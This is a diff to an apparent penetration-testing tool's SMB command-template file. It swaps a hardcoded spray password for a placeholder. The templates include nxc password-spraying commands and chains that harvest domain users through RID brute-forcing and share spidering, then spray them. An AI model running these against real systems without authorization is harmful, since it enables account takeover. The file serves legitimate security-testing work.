@@ -3,9 +3,11 @@ display_name = "SMB"
 icon = ""
 order = 20
 
-# Placeholders (TUI edit or `chronosphere run … -v key=val`):
+# Placeholders (`:variable` or `chronosphere variables set …`):
 #   share=SHARE_NAME   remote_path=\\path\\to\\file   local_path=./loot
 #   userlist=users.txt   wordlist=/usr/share/wordlists/rockyou.txt
+#   spray_password=Spring2026!   — spray pass (not the same as cred profile {password})
+#   new_password / computer_password — see ad-chains.toml header
 #
 # smbclient auth quick ref:
 #   guest/null  → -N  or  -U '' -N  or  -U 'guest%'
@@ -553,14 +555,14 @@ tags = ["download", "nxc", "share"]
 [[command]]
 id = "smb.nxc.password_spray"
 title = "nxc smb — password spray (user file vs single pass)"
-template = "nxc smb {target} -u {userlist} -p 'Spring2025!' --continue-on-success"
+template = "nxc smb {target} -u {userlist} -p '{spray_password}' --continue-on-success"
 requires = ["nxc"]
 tags = ["spray", "nxc", "noisy"]
 
 [[command]]
 id = "smb.nxc.password_spray_jitter"
 title = "nxc smb — password spray with jitter"
-template = "nxc smb {target} -u {userlist} -p 'Spring2025!' --jitter 5 --continue-on-success"
+template = "nxc smb {target} -u {userlist} -p '{spray_password}' --jitter 5 --continue-on-success"
 requires = ["nxc"]
 tags = ["spray", "nxc", "noisy"]
 
@@ -688,7 +690,7 @@ id = "smb.chain.enum_to_spray"
 title = "Harvest users → password spray"
 template = """nxc smb {target} {nxc_auth} --users 2>/dev/null \\
  | awk '/\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
- && nxc smb {target} -u {userlist} -p 'Spring2025!' --continue-on-success"""
+ && nxc smb {target} -u {userlist} -p '{spray_password}' --continue-on-success"""
 requires = ["nxc"]
 tags = ["chain", "spray", "harvest"]
 
@@ -706,6 +708,6 @@ title = "Spider shares → harvest users → spray"
 template = """nxc smb {target} {nxc_auth} -M spider_plus -o DOWNLOAD_FLAG=False \\
  && nxc smb {target} {nxc_auth} --users --rid-brute \\
  | awk '/SidTypeUser/ {print $NF} /\\\\/ {print $NF}' | cut -d'\\\\' -f2 | sort -u > {userlist} \\
- && nxc smb {target} -u {userlist} -p 'Spring2025!' --jitter 3 --continue-on-success"""
+ && nxc smb {target} -u {userlist} -p '{spray_password}' --jitter 3 --continue-on-success"""
 requires = ["nxc"]
 tags = ["chain", "spider", "spray", "harvest"]
